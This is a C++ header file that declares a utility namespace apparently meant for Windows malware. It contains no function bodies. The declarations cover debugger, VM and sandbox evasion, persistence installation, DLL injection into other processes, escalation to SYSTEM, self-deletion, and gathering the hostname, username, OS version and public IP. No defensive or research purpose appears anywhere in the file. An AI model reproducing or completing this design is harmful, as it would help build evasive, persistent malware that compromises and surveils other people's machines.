#pragma once
#include <windows.h>
#include <string>
#include <vector>

namespace Utils {
    // Anti-analysis
    bool IsDebuggerAttached();
    bool IsVM();
    bool IsSandbox();
    bool ShouldExit();
    
    // Persistence
    void InstallPersistence();
    void RemovePersistence();
    
    // Process utilities
    DWORD FindProcess(const wchar_t* name);
    bool InjectDLL(DWORD pid, const wchar_t* dllPath);
    bool ElevateToSystem();
    
    // File utilities
    bool WriteFileBinary(const std::string& path, const std::vector<BYTE>& data);
    std::vector<BYTE> ReadFileBinary(const std::string& path);
    bool DeleteSelf();
    
    // String utilities
    std::string WStringToString(const std::wstring& wstr);
    std::wstring StringToWString(const std::string& str);
    std::string GetTimestamp();
    
    // System info
    std::string GetHostname();
    std::string GetUsername();
    std::string GetOSVersion();
    std::string GetPublicIP();
    
    // Mutex
    bool CreateSingleton(const char* name);
}